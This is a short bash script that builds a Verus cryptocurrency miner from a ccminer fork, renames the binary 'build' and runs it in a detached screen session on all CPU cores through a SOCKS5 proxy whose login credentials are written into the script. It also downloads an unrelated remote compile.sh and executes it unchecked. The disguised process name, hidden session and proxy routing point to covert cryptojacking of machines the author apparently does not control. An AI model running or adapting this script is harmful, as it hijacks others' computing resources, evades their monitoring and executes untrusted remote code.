#!/bin/bash
proxy="socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080"
apt-get update
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
wget https://raw.githubusercontent.com/declined01/master/master/compile.sh
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh > null
sleep 10s
mv ccminer build
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RRT2bJnHu9n1Qzh4crRZZKFoX3HXrtTDer.nothing -p x -t $(nproc --all) -x $proxy
./compile.sh
